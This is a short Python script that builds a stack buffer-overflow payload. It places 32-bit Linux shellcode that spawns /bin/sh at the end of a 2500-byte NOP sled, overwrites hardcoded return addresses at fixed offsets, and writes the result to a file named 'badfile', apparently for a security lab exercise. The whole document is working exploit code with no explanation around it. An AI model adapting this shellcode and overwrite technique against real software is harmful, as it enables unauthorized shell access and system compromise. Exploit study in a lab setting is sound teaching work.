import sys

shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 

length = 2500
content = bytearray(0x90 for i in range(length))
start = length - len(shellcode)
content[start:] = shellcode

offset=492+480
ret = 0x565564a6 # nothing
content[offset:offset+4] = (ret).to_bytes(4, byteorder='little')
offset=496+480
ret = 0x56556404 # testandtry
content[offset:offset+4] = (ret).to_bytes(4, byteorder='little')
offset=500+480
content[offset:offset+1] = (0x00).to_bytes(1, byteorder='little')
# print(format(ret, '#x'))

offset=1216+496
# do more trial and error here
ret = 0xffffd4a8 + 250
content[offset:offset+4] = (ret).to_bytes(4, byteorder='little')

for i in range(len(content)):
	if (content[i] == 0x00):
		print('wth zero', i, content[i])

with open('badfile', 'wb') as f:
    f.write(content)